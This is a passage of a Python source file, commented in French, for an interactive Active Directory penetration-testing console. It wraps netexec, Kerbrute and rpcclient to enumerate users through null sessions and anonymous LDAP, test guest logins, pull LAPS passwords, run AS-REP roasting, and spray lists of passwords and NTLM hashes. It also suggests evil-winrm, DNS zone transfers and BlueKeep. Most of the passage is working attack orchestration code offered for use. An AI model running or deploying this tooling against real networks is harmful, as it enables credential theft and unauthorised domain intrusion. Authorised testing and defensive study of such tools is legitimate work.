                print(f"[*] Énumération des utilisateurs via SMB (Session Null) sur {target_ip}...")
                if NXC_AVAILABLE:
                    output, _ = run_command(["nxc", "smb", target_ip, "-u", "''", "-p", "''", "--users"])
                    if output:
                        found_users = parse_nxc_users_output(output)
                        if found_users:
                            print(f"[+] Utilisateurs trouvés via SMB Null: {', '.join(found_users)}")
                            discovered_users_set.update(found_users)
                        else:
                            print("[-] Aucun utilisateur trouvé ou parsing échoué.")
                else:
                    print("[-] Commande 'nxc' non disponible.")

            elif command == "ldapanon":
                print(f"[*] Énumération des utilisateurs via LDAP (Anonyme) sur {target_ip}...")
                if NXC_AVAILABLE:
                    # nxc ldap <ip> -u '' -p '' --users est plus général que --users-only qui n'existe peut-être pas
                    output, _ = run_command(["nxc", "ldap", target_ip, "-u", "''", "-p", "''", "--users"])
                    if output:
                        found_users = parse_nxc_users_output(output) # Réutiliser le parseur nxc
                        if found_users:
                            print(f"[+] Utilisateurs trouvés via LDAP Anonyme: {', '.join(found_users)}")
                            discovered_users_set.update(found_users)
                        else:
                            print("[-] Aucun utilisateur trouvé ou parsing échoué.")
                else:
                    print("[-] Commande 'nxc' non disponible.")

            elif command == "ldapexist":
                if len(cmd_parts) < 2:
                    print("Usage: ldapexist <users_file_path>")
                    continue
                users_file = cmd_parts[1]
                print(f"[*] Test d'existence de comptes LDAP depuis '{users_file}' sur {target_ip} (sans Kerberos)...")
                if NXC_AVAILABLE:
                    # nxc ldap <target_ip> -u <users_file> -p '' (le -k est pour l'auth kerberos, pas pour le test d'existence)
                    # La sortie de nxc pour cette commande indique généralement les utilisateurs valides.
                    # On peut essayer de parser les noms d'utilisateurs qui ont réussi.
                    # Exemple de succès: LDAP 10.0.0.5 389 DC01 user1: (Valid account)
                    # Ou simplement afficher la sortie et laisser l'utilisateur interpréter.
                    # Pour l'instant, on va supposer que nxc liste les utilisateurs valides.
                    # Un parsing plus fin serait nécessaire si le format est complexe.
                    print("[!] La sortie de nxc est affichée ci-dessus. Veuillez identifier manuellement les comptes valides.")
                    print("    L'ajout automatique à la liste des 'discovered_users' n'est pas implémenté pour cette méthode pour le moment.")
                    # Si on voulait parser:
                    # found_users = [] # Logique de parsing spécifique ici
                    # if found_users:
                    #     print(f"[+] Comptes existants trouvés: {', '.join(found_users)}")
                    #     discovered_users_set.update(found_users)
                else:
                    print("[-] Commande 'nxc' non disponible.")
            
            elif command == "kerbrute":
                if not KERBRUTE_AVAILABLE:
                    print("[-] La commande 'kerbrute' n'est pas installée ou n'est pas dans le PATH.")
                    print("    Veuillez l'installer depuis : https://github.com/ropnop/kerbrute")
                    continue

                domain_name = get_user_input(ud_session, "Nom de domaine AD (ex: contoso.local): ")
                if not domain_name: continue

                user_list_path = get_user_input(ud_session, "Chemin vers la liste de noms d'utilisateurs: ")
                if not user_list_path: continue
                
                dc_ip_override = get_user_input(ud_session, f"IP du DC (laisser vide pour utiliser {target_ip}): ", default=target_ip)
                if not dc_ip_override: dc_ip_override = target_ip


                print(f"[*] Utilisation de Kerbrute pour énumérer les utilisateurs du domaine '{domain_name}' avec la liste '{user_list_path}' contre DC '{dc_ip_override}'...")
                kerbrute_cmd = ["kerbrute", "userenum", "--domain", domain_name, "--dc", dc_ip_override, user_list_path]
                
                output, _ = run_command(kerbrute_cmd)
                if output:
                    found_users = parse_kerbrute_output(output)
                    if found_users:
                        print(f"[+] Utilisateurs valides trouvés par Kerbrute: {', '.join(found_users)}")
                        discovered_users_set.update(found_users)
                    else:
                        print("[-] Aucun utilisateur valide trouvé par Kerbrute ou parsing échoué.")
            else:
                print(f"Commande inconnue dans le Mode Découverte d'Utilisateurs: {command}. Tapez 'help'.")

        except (KeyboardInterrupt, EOFError):
            print("\n[!] Action annulée dans le Mode Découverte d'Utilisateurs.")
            continue


# --- Fonctions d'exploration ---

def get_user_input(session, message, completer=None, default=""):
    """Obtient une entrée de l'utilisateur avec gestion de l'annulation (Ctrl+C/Ctrl+D)."""
    try:
        return session.prompt(message, completer=completer, default=default).strip()
    except (KeyboardInterrupt, EOFError):
        print("\n[!] Action annulée.")
        return None

def smb_menu_help():
    print("\nCommandes d'exploration SMB disponibles:")
    print("  hosts <range>       - Découvrir les hôtes SMB actifs sur une plage réseau (ex: hosts 192.168.1.0/24).")
    print("  nullsession         - Tester la session NULL et lister partages/utilisateurs si accessible.")
    print("  guestlogin          - Tester le login GUEST et lister partages si accessible.")
    print("  laps                - Tenter de récupérer les mots de passe LAPS (nécessite des identifiants valides).")
    print("  shares              - Lister les partages (nécessite des identifiants ou session null/guest).")
    print("  download <share> <remote_path> [local_path] - Télécharger un fichier (TODO: suggérer smbclient/smbget).")
    print("  help                - Afficher cette aide.")
    print("  back                - Retourner au menu principal.")

def explore_smb(target_ip, ports, main_session):
    logging.info(f"Entrée dans le menu d'exploration SMB pour {target_ip}:{ports}")
    if not NXC_AVAILABLE:
        print("[-] La commande 'nxc' (netexec) n'est pas disponible. L'exploration SMB avancée est limitée.")
        print("    Vous pouvez toujours utiliser 'set creds' et tenter des connexions manuelles avec des outils externes.")
        # On pourrait quand même proposer des actions manuelles ou des suggestions d'outils
        # return # Ou continuer avec des fonctionnalités limitées

    smb_completer = WordCompleter([
        "hosts", "nullsession", "guestlogin", "laps", "shares", "download", "help", "back"
    ], ignore_case=True)
    
    smb_session = PromptSession(history=FileHistory('.ad_explorer_smb_history'), auto_suggest=AutoSuggestFromHistory(), style=cli_style)

    print(f"\n[*] Exploration SMB sur {target_ip} (ports: {', '.join(map(str, ports))}). Tapez 'help' pour les options.")

    while True:
        try:
            action = smb_session.prompt(f"SMB ({target_ip})> ", completer=smb_completer).strip().lower()
            if not action:
                continue
            
            cmd_parts = action.split()
            command = cmd_parts[0]

            if command == "back":
                logging.info(f"Sortie du menu SMB pour {target_ip}")
                break
            elif command == "help":
                smb_menu_help()
            elif command == "hosts":
                if len(cmd_parts) < 2:
                    print("Usage: hosts <network_range/target_ip>")
                    continue
                network_range = cmd_parts[1]
                print(f"[*] Découverte des hôtes SMB sur {network_range}...")
                if NXC_AVAILABLE:
                    run_command(["nxc", "smb", network_range])
                else:
                    print("[-] Commande 'nxc' non disponible.")
            elif command == "nullsession":
                print(f"[*] Test de la session NULL sur {target_ip}...")
                if NXC_AVAILABLE:
                    run_command(["nxc", "smb", target_ip, "-u", "''", "-p", "''"])
                    print(f"[*] Listage des partages via session NULL sur {target_ip}...")
                    run_command(["nxc", "smb", target_ip, "-u", "''", "-p", "''", "--shares"])
                    print(f"[*] Énumération des utilisateurs via session NULL sur {target_ip}...")
                    run_command(["nxc", "smb", target_ip, "-u", "''", "-p", "''", "--users"])
                else:
                    print("[-] Commande 'nxc' non disponible.")
            elif command == "guestlogin":
                print(f"[*] Test du login GUEST sur {target_ip}...")
                if NXC_AVAILABLE:
                    output_guest_test, _ = run_command(["nxc", "smb", target_ip, "-u", "Guest", "-p", "''"])
                    # Netexec peut ne pas explicitement dire "SUCCESS" mais plutôt lister les partages si ça marche
                    # On pourrait analyser la sortie pour un pattern de succès ou simplement essayer de lister les partages
                    if output_guest_test and "Pwn3d!" in output_guest_test or "READ" in output_guest_test.upper(): # Heuristique simple
                        print("[+] Login GUEST semble avoir réussi ou des accès ont été obtenus.")
                        print(f"[*] Listage des partages via login GUEST sur {target_ip}...")
                        run_command(["nxc", "smb", target_ip, "-u", "Guest", "-p", "''", "--shares"])
                    else:
                        print("[-] Le login GUEST a échoué ou n'a pas donné d'accès visible.")
                    # Tenter aussi avec 'guest' en minuscule
                    output_guest_test_lc, _ = run_command(["nxc", "smb", target_ip, "-u", "guest", "-p", "''"])
                    if output_guest_test_lc and "Pwn3d!" in output_guest_test_lc or "READ" in output_guest_test_lc.upper():
                        print("[+] Login 'guest' (minuscule) semble avoir réussi ou des accès ont été obtenus.")
                        print(f"[*] Listage des partages via login 'guest' sur {target_ip}...")
                        run_command(["nxc", "smb", target_ip, "-u", "guest", "-p", "''", "--shares"])
                    elif not ("Pwn3d!" in output_guest_test or "READ" in output_guest_test.upper()): # Si le premier n'a rien donné
                        print("[-] Le login 'guest' (minuscule) a également échoué ou n'a pas donné d'accès visible.")

                else:
                    print("[-] Commande 'nxc' non disponible.")
            elif command == "laps":
                if not credentials["username"] or not credentials["password"]:
                    print("[-] Veuillez d'abord définir un nom d'utilisateur et un mot de passe avec 'set user' et 'set password'.")
                    continue
                print(f"[*] Tentative de récupération LAPS sur {target_ip} avec les identifiants fournis...")
                if NXC_AVAILABLE:
                    cmd = ["nxc", "smb", target_ip, "-u", credentials["username"], "-p", credentials["password"], "--laps"]
                    if credentials["domain"]:
                        cmd.extend(["-d", credentials["domain"]])
                    run_command(cmd)
                else:
                    print("[-] Commande 'nxc' non disponible.")
            elif command == "shares":
                print(f"[*] Listage des partages sur {target_ip}...")
                if NXC_AVAILABLE:
                    if credentials["username"] and credentials["password"]:
                        cmd = ["nxc", "smb", target_ip, "-u", credentials["username"], "-p", credentials["password"], "--shares"]
                        if credentials["domain"]:
                            cmd.extend(["-d", credentials["domain"]])
                        run_command(cmd)
                    else:
                        print("[!] Aucun identifiant fourni. Tentative avec session NULL (si 'nullsession' a été testé positivement) ou GUEST.")
                        print("    Pour une énumération authentifiée, utilisez 'set user', 'set pass'.")
                        # On pourrait ici retenter avec null/guest si l'utilisateur le souhaite
                        run_command(["nxc", "smb", target_ip, "-u", "''", "-p", "''", "--shares"])

                else:
                    print("[-] Commande 'nxc' non disponible.")

            elif command == "download":
                print("  Fonctionnalité de téléchargement à implémenter (ou suggérer des outils).")
                print("  Exemple avec smbclient (outil CLI):")
                print(f"  smbclient //{target_ip}/<share_name> -U \"{credentials['domain']}\\{credentials['username']}%{credentials['password'] if credentials['password'] else ''}\" -c \"get <remote_file> <local_file>\"")
                print("  Ou utilisez un outil comme smbget.")

            else:
                print(f"Commande SMB inconnue: {command}. Tapez 'help'.")

        except (KeyboardInterrupt, EOFError):
            print("\n[!] Action annulée dans le menu SMB.")
            continue # Reste dans le sous-menu SMB

def ldap_menu_help():
    print("\nCommandes d'exploration LDAP disponibles:")
    print("  testuser <file> [range] - Tester l'existence de comptes (sans Kerberos) depuis un fichier. Optionnel: plage réseau.")
    print("  enumusers [file]    - Énumérer tous les utilisateurs (nécessite des identifiants). Optionnel: fichier de sortie.")
    print("  query <filter> <attrs> - Exécuter une requête LDAP brute (nécessite des identifiants). ex: query \"(objectClass=user)\" \"sAMAccountName description\"")
    print("  asreproast [file]   - Tenter AS-REP Roasting. Optionnel: fichier de sortie.")
    print("  kerberoast [file]   - Tenter Kerberoasting (nécessite des identifiants). Optionnel: fichier de sortie.")
    print("  finddelegation      - Découvrir les délégations mal configurées (nécessite des identifiants).")
    print("  info                - Obtenir des informations de base sur le domaine (NamingContexts).")
    print("  help                - Afficher cette aide.")
    print("  back                - Retourner au menu principal.")


def explore_ldap(target_ip, ldap_ports, session):
    """Menu interactif pour explorer les services LDAP/LDAPS."""
    ldap_menu_prompt = f"ADExplorer ({AnsiColors.YELLOW}{target_ip}{AnsiColors.ENDC}/LDAP)> "
    
    ldap_commands_help = {
        "help": "Afficher ce message d'aide.",
        "query <filter> [attributes]": "Effectuer une requête LDAP (ex: query \"(objectClass=user)\" sAMAccountName displayName).",
        "asreproast <output_file.txt>": "Tenter une attaque AS-REP Roasting.",
        "back": "Retourner au menu précédent."
    }
    # Pour NestedCompleter, les commandes finales ont None comme valeur
    ldap_commands_completer = {
        "help": None,
        "query": None, # L'utilisateur tapera le filtre ensuite
        "asreproast": None, # L'utilisateur tapera le nom du fichier
        "back": None,
    }
    ldap_completer = NestedCompleter.from_nested_dict(ldap_commands_completer)

    print_target_menu(ldap_commands_help)

    while True:
        try:
            ldap_input = session.prompt(
                ldap_menu_prompt,
                completer=ldap_completer,
                auto_suggest=AutoSuggestFromHistory(),
                style=cli_style
            ).strip()

            if not ldap_input:
                continue

            parts = ldap_input.split()
            command = parts[0].lower()
            args = parts[1:]

            if command == "back":
                break
            elif command == "help":
                print_target_menu(ldap_commands_help)
            elif command == "query":
                if len(args) < 2:
                    print("Usage: query <ldap_filter> <attributes>")
                    continue
                ldap_filter = args[0]
                attributes = args[1]
                print(f"[*] Exécution de la requête LDAP via ldap: Filtre='{ldap_filter}', Attributs='{attributes}'...")
                if NXC_AVAILABLE:
                    run_command(["nxc", "ldap", target_ip, "-u", "", "-p", "", "--ldap-filter", ldap_filter, "--attributes", attributes])
                else:
                    print(f"    Alternative: ldapsearch -x -H ldap://{target_ip} -D \"{credentials['domain']}\\{credentials['username']}\" -w \"{credentials['password']}\" -b \"<base_dn>\" \"{ldap_filter}\" {attributes}")
            elif command == "asreproast":
                if not args:
                    print("Usage: asreproast <output_file.txt>")
                    continue
                output_file = args[0]
                # Déterminer si SSL doit être utilisé en fonction des ports
                use_ssl = 636 in ldap_ports or 3269 in ldap_ports
                
                # Le domaine est nécessaire pour AS-REP Roasting.
                # Utiliser le domaine globalement défini dans multi_credentials ou credentials
                # Ou demander à l'utilisateur s'il n'est pas défini.
                domain_to_use = multi_credentials.get("domain") or credentials.get("domain")
                if not domain_to_use:
                    try:
                        domain_to_use = session.prompt(
                            "Veuillez entrer le nom de domaine cible pour AS-REP Roasting (ex: contoso.local): ",
                            style=cli_style
                        ).strip()
                        if not domain_to_use:
                            print("[-] Nom de domaine requis pour AS-REP Roasting.")
                            continue
                    except (KeyboardInterrupt, EOFError):
                        print("\nOpération annulée.")
                        continue
                
                print(f"[*] Tentative d'AS-REP Roasting sur {target_ip} pour le domaine {domain_to_use}. Sortie vers {output_file}")
                # nxc ldap <target> [-d <domain>] --asreproast <file> [--ssl si port 636/3269]
                # nxc ne prend pas -u/-p pour asreproast car il cible les comptes sans pré-auth Kerberos
                cmd_asrep = [NXC_CMD, "ldap", target_ip, "-d", domain_to_use, "--asreproast", output_file]
                if use_ssl:
                    cmd_asrep.append("--ssl")
                
                run_command(cmd_asrep, capture_output=False) # Afficher la sortie en direct

            else:
                print(f"Commande LDAP inconnue: {command}")

        except KeyboardInterrupt:
            print("\nRetour au menu précédent (Ctrl+C)")
            break
        except EOFError:
            print("\nRetour au menu précédent (Ctrl+D)")
            break
        except Exception as e:
            logging.error(f"Erreur dans le menu LDAP: {e}", exc_info=True)
            print(f"Erreur: {e}")

def rpc_menu_help():
    print("\nCommandes d'exploration RPC disponibles:")
    print("  enumusers           - Énumérer les utilisateurs du domaine via rpcclient (connexion null).")
    print("  custom <cmd_str>    - Exécuter une commande rpcclient personnalisée (ex: custom queryuser 0x3e8).")
    print("                      Utilisez avec prudence. Les commandes sont passées après la connexion.")
    print("  help                - Afficher cette aide.")
    print("  back                - Retourner au menu principal.")

def explore_rpc(target_ip, ports, main_session):
    logging.info(f"Entrée dans le menu d'exploration RPC pour {target_ip}:{ports}")
    if not RPCCLIENT_AVAILABLE:
        print("[-] La commande 'rpcclient' n'est pas disponible. L'exploration RPC est limitée.")
        return

    rpc_completer = WordCompleter(["enumusers", "custom", "help", "back"], ignore_case=True)
    rpc_session = PromptSession(history=FileHistory('.ad_explorer_rpc_history'), auto_suggest=AutoSuggestFromHistory(), style=cli_style)

    print(f"\n[*] Exploration RPC/DCOM sur {target_ip} (port mapper: {', '.join(map(str, ports))}). Tapez 'help' pour les options.")

    while True:
        try:
            action = rpc_session.prompt(f"RPC ({target_ip})> ", completer=rpc_completer).strip().lower()
            if not action:
                continue
            
            cmd_parts = action.split()
            command = cmd_parts[0]

            if command == "back":
                logging.info(f"Sortie du menu RPC pour {target_ip}")
                break
            elif command == "help":
                rpc_menu_help()
            elif command == "enumusers":
                print(f"[*] Énumération des utilisateurs du domaine via rpcclient sur \\\\{target_ip} (session null)...")
                # La commande est `rpcclient -N -U "" -c "enumdomusers" \\target_ip`
                # ou interractivement: rpcclient -N -U "" \\target_ip puis enumdomusers
                # Pour subprocess, il est plus simple de passer la commande directement.
                run_command(["rpcclient", "-N", "-U", "", f"\\\\{target_ip}", "-c", "enumdomusers"])
            elif command == "custom":
                if len(cmd_parts) < 2:
                    print("Usage: custom <rpcclient_command_string>")
                    print("Exemple: custom \"queryuser 0x3e8\"")
                    continue
                rpc_command_str = " ".join(cmd_parts[1:])
                print(f"[*] Exécution de la commande rpcclient personnalisée sur \\\\{target_ip}: '{rpc_command_str}'")
                print("[!] Attention: Les commandes personnalisées peuvent être intrusives ou déstabilisantes.")
                
                user_arg = f"{credentials['domain']}\\{credentials['username']}" if credentials["domain"] and credentials["username"] else credentials["username"]
                pass_arg = credentials["password"]
                
                cmd_list = ["rpcclient"]
                if user_arg and pass_arg:
                    cmd_list.extend(["-U", f"{user_arg}%{pass_arg}"])
                elif user_arg: # User mais pas de pass (ex: session null avec un user spécifique)
                    cmd_list.extend(["-U", user_arg, "-N"]) # -N pour pas de prompt de mot de passe
                else: # Complètement anonyme
                    cmd_list.extend(["-N", "-U", ""])

                cmd_list.extend([f"\\\\{target_ip}", "-c", rpc_command_str])
                run_command(cmd_list)
            else:
                print(f"Commande RPC inconnue: {command}. Tapez 'help'.")

        except (KeyboardInterrupt, EOFError):
            print("\n[!] Action annulée dans le menu RPC.")
            continue

# --- Fonctions d'exploration (placeholders pour les autres) ---
def explore_mssql(target_ip, ports):
    logging.info(f"Exploration MSSQL sur {target_ip}:{ports} demandée.")
    print(f"[*] Exploration MSSQL sur {target_ip} (ports: {', '.join(map(str, ports))})...")
    print("  Fonctionnalité à implémenter :")
    print("  - Lister les bases de données")
    print("  - Exécuter des requêtes SQL (basiques)")
    # Ici, intégrer la logique avec pymssql ou pyodbc
    print("\n  Suggestions d'outils externes:")
    print("  - nxc mssql <target_ip> -u <user> -p <pass> --sql-query \"SELECT @@version\"")
    print("  - sqsh -S <target_ip> -U <user> -P <pass>")
    print("  - mssqlclient.py (impacket)")

def explore_rdp(target_ip, ports):
    logging.info(f"Information RDP sur {target_ip}:{ports}.")
    print(f"[*] Service RDP détecté sur {target_ip} (ports: {', '.join(map(str, ports))}).")
    print("  - Le port RDP est ouvert.")
    print("  - Attaques potentielles : force brute, vulnérabilités connues (ex: BlueKeep).")
    print("  - Pour la connexion, utilisez des outils comme xfreerdp ou rdesktop:")
    print(f"    xfreerdp /v:{target_ip}")
    if credentials["username"]:
         print(f"    xfreerdp /u:{credentials['username']} /v:{target_ip}")
    print("\n  Suggestions d'outils/commandes nxc:")
    print(f"  - nxc rdp {target_ip} (pour vérifier la version, etc.)")


def explore_winrm(target_ip, ports):
    logging.info(f"Exploration WinRM sur {target_ip}:{ports} demandée.")
    print(f"[*] Exploration WinRM sur {target_ip} (ports: {', '.join(map(str, ports))})...")
    print("  Fonctionnalité à implémenter :")
    print("  - Exécuter des commandes PowerShell")
    print("  - Afficher la configuration WinRM")
    # Ici, intégrer la logique avec pywinrm
    print("\n  Suggestions d'outils externes/nxc:")
    print(f"  - nxc winrm {target_ip} -u <user> -p <pass> -x 'whoami'")
    print(f"  - evil-winrm -i {target_ip} -u <user> -p <pass>")

def explore_dns(target_ip, ports):
    logging.info(f"Information DNS sur {target_ip}:{ports}.")
    print(f"[*] Service DNS détecté sur {target_ip} (ports: {', '.join(map(str, ports))}).")
    print("  - Le port DNS est ouvert. Ce serveur pourrait être un serveur DNS.")
    print("  - Actions possibles : tentatives de transfert de zone (AXFR), énumération de noms.")
    print(f"  - Exemple avec dig : dig axfr @{target_ip} <domain_name>")
    print("\n  Suggestions d'outils/commandes nxc:")
    print(f"  - nxc dns {target_ip} --zonetransfer <domain_name> (si le serveur DNS est la cible)")


def explore_kerberos(target_ip, ports):
    logging.info(f"Information Kerberos sur {target_ip}:{ports}.")
    print(f"[*] Service Kerberos détecté sur {target_ip} (ports: {', '.join(map(str, ports))}).")
    print("  - Le port Kerberos est ouvert. Ce serveur est probablement un Contrôleur de Domaine.")
    print("  - Actions possibles : énumération d'utilisateurs (Kerbrute), AS-REP Roasting, etc.")
    print("\n  Suggestions d'outils:")
    print("  - kerbrute (pour l'énumération d'utilisateurs, password spraying)")
    print("  - Rubeus, Impacket (getTGT, getST)")
    print("  - Les commandes LDAP de nxc (asreproast, kerberoast) ciblent le KDC via LDAP.")


# --- Gestionnaire de commandes CLI ---
def display_help():
    print("\nCommandes disponibles :")
    print("  explore <service>   - Explorer un service détecté (ex: explore SMB).")
    print("                        Services possibles: SMB, LDAP, LDAPS, MSSQL, RDP, WinRM_HTTP, WinRM_HTTPS, RPC_Mapper, DNS, Kerberos, GlobalCatalog_LDAP, GlobalCatalog_LDAPS")
    print("  discoverusers       - Entrer en Mode Découverte d'Utilisateurs (SMB Null, LDAP Anon, Kerbrute).")
    print("  services            - Afficher à nouveau les services détectés.")
    print("  set user <username> - Définir le nom d'utilisateur pour les connexions.")
    print("  set password <pass> - Définir le mot de passe pour les connexions.")
    print("  set domain <domain> - Définir le domaine pour les connexions.")
    print("  creds               - Afficher les identifiants actuellement configurés.")
    print("  clear creds         - Effacer les identifiants configurés.")
    print("  help                - Afficher ce message d'aide.")
    print("  log                 - Afficher le chemin du fichier de log.")
    print("  exit                - Quitter l'application.")

def print_target_menu(commands_dict):
    """Affiche le menu des commandes pour une cible de manière structurée."""
    print(f"\n{AnsiColors.BOLD}Commandes disponibles pour la cible actuelle:{AnsiColors.ENDC}")

    # Déterminer la largeur maximale pour l'alignement des commandes
    max_cmd_len = 0
    for section_details in commands_dict.values():
        for cmd_example in section_details.keys():
            if len(cmd_example) > max_cmd_len:
                max_cmd_len = len(cmd_example)
    max_cmd_len += 2 # Ajouter un peu d'espace

    for section_title, section_commands in commands_dict.items():
        print(f"\n  {AnsiColors.CYAN}{section_title}{AnsiColors.ENDC}")
        print(f"  {''.join(['-'] * (len(section_title) + 2))}") # Ligne de séparation
        for cmd_example, description in section_commands.items():
            print(f"    {AnsiColors.YELLOW}{cmd_example:<{max_cmd_len}}{AnsiColors.ENDC} {description}")
    print("")

def main_loop(target_ip, scanned_ports, session):
    """Boucle principale pour interagir avec une cible."""
    logging.info(f"Entrée dans la boucle principale pour {target_ip}. Ports scannés: {scanned_ports}")
    
    # Dictionnaire des commandes pour l'affichage de l'aide (structuré par sections)
    target_commands_help = {
        "Informations et Scan": {
            "help": "Afficher ce message d'aide.",
            "services": "Afficher les services et ports ouverts détectés sur la cible.",
            "prelim_scan": "Lancer un scan préliminaire complet (LDAP, SMB, etc.) pour des infos de base et vulnérabilités communes.",
            "exit": "Quitter AD Explorer."
        },
        "Gestion des Identifiants": {
            "set user <username>": "Définir le nom d'utilisateur pour les actions manuelles futures.",
            "set password <password>": "Définir le mot de passe pour les actions manuelles futures.",
            "set domain <domain>": "Définir le domaine pour les actions manuelles futures (et pour `testcreds` si non spécifié dans multi_credentials).",
        },
        "Gestion des Identifiants (Tests Multiples)": {
            "set users <user1,user2,...>": "Définir une liste d'utilisateurs pour `testcreds`.",
            "set usersfile <path/to/users.txt>": "Charger une liste d'utilisateurs depuis un fichier pour `testcreds`.",
            "set passwords <pass1,pass2,...>": "Définir une liste de mots de passe pour `testcreds`.",
            "set passwordsfile <path/to/pass.txt>": "Charger une liste de mots de passe depuis un fichier pour `testcreds`.",
            "set hashes <hash1,hash2,...>": "Définir une liste de hashes NTLM pour `testcreds`.",
            "set hashesfile <path/to/hashes.txt>": "Charger une liste de hashes NTLM depuis un fichier pour `testcreds`.",
            "set domain <domain_name>": "Définir le domaine cible pour les tests d'identifiants multiples (affecte `multi_credentials.domain`).",
        },
        "Affichage et Nettoyage des Identifiants": {
            "creds": "Afficher tous les identifiants actuellement configurés (session unique et multiples).",
            "clear creds": "Effacer tous les identifiants configurés (session unique et multiples)."
        },
        "Actions d'Exploration et Tests (par protocole)": {
            "smb": "Explorer les services SMB détectés (partages, sessions, RID brute, SAM, etc.).",
            "ldap": "Explorer les services LDAP/LDAPS détectés (requêtes, AS-REP/Kerberoasting, politique de mdp, etc.).",
            "mssql": "Explorer les services MSSQL détectés.",
            "discoverusers": "Accéder au sous-menu pour les techniques de découverte d'utilisateurs (Kerbrute, RPC, etc.).",
            "testcreds": "Lancer une batterie de tests d'authentification avec les identifiants multiples configurés sur les services."
        },
        "Utilitaires Réseau": {
            "generatehosts <subnet_cidr>": "Découvrir les hôtes sur un sous-réseau et générer des entrées /etc/hosts (ex: 10.10.10.0/24)."
        }
    }

    # Dictionnaire pour NestedCompleter (toutes les commandes de premier niveau ont None comme valeur)
    # Ce dictionnaire doit refléter la structure des commandes utilisables.
    target_commands_completer_dict = {
        "help": None,
        "services": None,
        "prelim_scan": None,
        "smb": None, 
        "ldap": None, 
        "mssql": None, # Ajout de mssql
        "discoverusers": None,
        "testcreds": None,
        "set": {
            "user": None,
            "password": None,
            "domain": None,
            "users": None,
            "usersfile": None, # Pourrait bénéficier d'un PathCompleter
            "passwords": None,
            "passwordsfile": None, # Pourrait bénéficier d'un PathCompleter
            "hashes": None,
            "hashesfile": None # Pourrait bénéficier d'un PathCompleter
        },
        "creds": None,
        "clear": {
            "creds": None
        },
        "generatehosts": None, # Ajout de generatehosts
        "back": None,
        "exit": None
    }
    
    target_completer = NestedCompleter.from_nested_dict(target_commands_completer_dict)

    while True:
        prompt_text = f"ADExplorer ({AnsiColors.YELLOW}{target_ip}{AnsiColors.ENDC})> "
        
        # Construction du bottom_toolbar
        current_creds_display = []
        if credentials["username"]:
            user_display = credentials["username"]
            if credentials["domain"]:
                user_display = f"{credentials['domain']}\\{user_display}"
            current_creds_display.append(f"User: {user_display}")
        if credentials["password"]:
            current_creds_display.append("Pass: Set")
        
        toolbar_text = f"Log: {LOG_FILE}"
        if current_creds_display:
            toolbar_text += " | " + " | ".join(current_creds_display)

        def get_bottom_toolbar():
            return toolbar_text

        try:
            user_input = session.prompt(
                prompt_text,
                completer=target_completer,
                auto_suggest=AutoSuggestFromHistory(),
                style=cli_style, 
                bottom_toolbar=get_bottom_toolbar
            )
            user_input = user_input.strip()
            if not user_input:
                continue

            logging.info(f"Commande reçue: {user_input}")
            command_parts = user_input.lower().split()
            command = command_parts[0]

            if command == "exit":
                logging.info("Sortie de l'application.")
                print("Au revoir !")
                break
            elif command == "back":
                logging.info(f"Retour demandé depuis {target_ip}. Dans ce contexte, cela quitte la session cible.")
                print("Retour... (quitte la session cible actuelle)")
                break
            elif command == "help":
                print_target_menu(target_commands_help)
            elif command == "prelim_scan":
                run_preliminary_scan(target_ip, scanned_ports, session)
            elif command == "smb":
                smb_ports_list = scanned_ports.get("SMB", [])
                if not smb_ports_list:
                    print(f"[-] Aucun port SMB (139, 445) n'a été détecté sur {target_ip}.")
                    logging.warning(f"Tentative d'exploration SMB sans ports SMB détectés pour {target_ip}")
                    continue
                explore_smb(target_ip, smb_ports_list, session)
            elif command == "ldap":
                ldap_ports_list = scanned_ports.get("LDAP", [])
                ldaps_ports_list = scanned_ports.get("LDAPS", [])
                
                combined_ldap_ports = ldap_ports_list + ldaps_ports_list
                
                if not combined_ldap_ports:
                    print(f"[-] Aucun port LDAP (389) ou LDAPS (636) n'a été détecté sur {target_ip}.")
                    logging.warning(f"Tentative d'exploration LDAP sans ports LDAP/LDAPS détectés pour {target_ip}")
                    continue
                explore_ldap(target_ip, combined_ldap_ports, session)
            elif command == "mssql": # Nouvelle commande mssql
                mssql_ports_list = scanned_ports.get("MSSQL", [])
                if not mssql_ports_list:
                    print(f"[-] Aucun port MSSQL (1433) n'a été détecté sur {target_ip}.")
                    logging.warning(f"Tentative d'exploration MSSQL sans port MSSQL détecté pour {target_ip}")
                    continue
                explore_mssql(target_ip, mssql_ports_list, session)
            elif command == "discoverusers":
                user_discovery_mode(target_ip, session)
            elif command == "services":
                print("\n[+] Services potentiels détectés :")
                if scanned_ports:
                    for service, ports in scanned_ports.items():
                        print(f"  - {service} (Ports: {', '.join(map(str, ports))})")
                else:
                    print("  Aucun service n'a été détecté lors du scan initial.")
            elif command == "set":
                if len(command_parts) > 2:
                    set_type = command_parts[1].lower()
                    value_parts = command_parts[2:]
                    value = " ".join(value_parts)

                    if set_type == "user":
                        credentials["username"] = value
                        print(f"Utilisateur unique défini sur : {value}")
                        logging.info(f"Identifiant unique 'username' défini.")
                    elif set_type == "password":
                        credentials["password"] = value
                        print("Mot de passe unique défini.")
                        logging.info(f"Identifiant unique 'password' défini.")
                    elif set_type == "domain":
                        credentials["domain"] = value
                        multi_credentials["domain"] = value
                        print(f"Domaine défini sur : {value}")
                        logging.info(f"Domaine '{value}' défini.")
                    elif set_type == "users":
                        multi_credentials["users"] = [u.strip() for u in value.split(',')]
                        multi_credentials["users_file"] = None
                        print(f"Liste d'utilisateurs définie ({len(multi_credentials['users'])} utilisateurs).")
                        logging.info("Liste d'utilisateurs pour multi_credentials définie.")
                    elif set_type == "usersfile":
                        if os.path.isfile(value):
                            multi_credentials["users_file"] = value
                            multi_credentials["users"] = []
                            print(f"Fichier d'utilisateurs défini sur : {value}")
                            logging.info(f"Fichier d'utilisateurs '{value}' pour multi_credentials défini.")
                        else:
                            print(f"[-] Erreur: Fichier '{value}' introuvable.")
                    elif set_type == "passwords":
                        multi_credentials["passwords"] = [p.strip() for p in value.split(',')]
                        multi_credentials["passwords_file"] = None
                        print(f"Liste de mots de passe définie ({len(multi_credentials['passwords'])} mots de passe).")
                        logging.info("Liste de mots de passe pour multi_credentials définie.")
                    elif set_type == "passwordsfile":
                        if os.path.isfile(value):
                            multi_credentials["passwords_file"] = value
                            multi_credentials["passwords"] = []
                            print(f"Fichier de mots de passe défini sur : {value}")
                            logging.info(f"Fichier de mots de passe '{value}' pour multi_credentials défini.")
                        else:
                            print(f"[-] Erreur: Fichier '{value}' introuvable.")
                    elif set_type == "hashes":
                        multi_credentials["hashes"] = [h.strip() for h in value.split(',')]
                        multi_credentials["hashes_file"] = None
                        print(f"Liste de hashes définie ({len(multi_credentials['hashes'])} hashes).")
